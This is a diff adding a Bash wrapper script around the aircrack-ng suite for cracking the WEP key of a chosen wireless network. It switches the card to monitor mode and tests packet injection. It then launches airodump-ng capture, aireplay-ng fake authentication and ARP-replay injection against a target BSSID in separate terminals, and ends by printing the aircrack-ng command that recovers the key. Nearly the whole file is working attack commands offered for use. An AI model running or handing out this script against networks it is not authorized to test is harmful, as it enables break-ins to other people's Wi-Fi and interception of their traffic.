@@ -1,0 +1,93 @@
+#!/bin/bash
+##################################################################
+# Es un Wrapper para aircrack-ng
+# Autor: Michael Pratt | http://wwww.michael-pratt.com/
+#
+# Licencia: MIT
+# Copyright (C) 2012 by Michael Pratt <pratt@hablarmierda.net>
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+# THE SOFTWARE.
+##################################################################
+# set -e
+if [ "${#}" -lt "1" ]; then
+	echo "$(basename $0) <essid|list> <bssid> <channel> <output directory>"
+    echo "Example: $(basename $0) MyWifi 00:00:00:00:00 11 /home/name/wep/"
+	exit 0
+fi
+
+WLAN="wlan0"
+MON="mon0"
+ESSID=${1}
+BSSID=${2}
+CHANNEL=${3}
+TERMINAL="xterm"
+
+if [ -z "${4}" ]; then
+    CWD=$(pwd)
+else
+    CWD=${4}
+fi
+
+if ! [ -e "${CWD}" ]; then
+    mkdir -p ${CWD}
+fi
+
+cd ${CWD}
+
+trap "sudo airmon-ng stop ${MON}" 0 1 2 5 15
+if [[ "${ESSID}" == "list" ]]; then
+    echo "List urls"
+    sudo airmon-ng start ${WLAN} ${CHANNEL}
+    sudo airodump-ng ${MON}
+    exit 0
+fi
+
+sudo airmon-ng start ${WLAN} ${CHANNEL}
+sudo aireplay-ng -9 -e ${ESSID} -a ${BSSID} ${MON}
+
+read -p "Is the injection greater than 50? (y/n)? " ANSWER
+if [[ "${ANSWER}" == "n" ]]; then
+	echo "Try another AP :("
+	exit 0
+fi
+
+if ! [ -e "${ESSID}" ]; then
+	echo "Creating dir ${ESSID}"
+	mkdir ${ESSID}
+fi
+cd ${CWD}/${ESSID}
+
+echo "Run airodump (sudo airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${CWD}/${ESSID}/output ${MON})"
+${TERMINAL} -e "sudo airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${CWD}/${ESSID}/output ${MON}" &
+
+echo "Run Aireplay and authenticate (sudo aireplay-ng -1 6000 -o 1 -q 360 -e ${ESSID} -a ${BSSID} ${MON})"
+${TERMINAL} -e "sudo aireplay-ng -1 6000 -o 1 -q 360 -e ${ESSID} -a ${BSSID} ${MON}" &
+# Normal: ${TERMINAL} -e "sudo aireplay-ng -1 0 -e ${ESSID} -a ${BSSID} ${MON}"
+
+echo "Run Aireplay and send packets (sudo aireplay-ng -3 -b ${BSSID} ${MON})"
+${TERMINAL} -e "sudo aireplay-ng -3 -b ${BSSID} ${MON}" &
+
+QUIT="n"
+while [[ "${QUIT}" != "y" ]]; do
+	read -p "Stop now? (y/n)? " QUIT
+done
+
+#sudo aircrack-ng -b ${BSSID} ${CWD}/${ESSID}/output*.cap
+echo "Please run: sudo aircrack-ng -b ${BSSID} ${CWD}/${ESSID}/output*.cap"
+echo "Bye!"
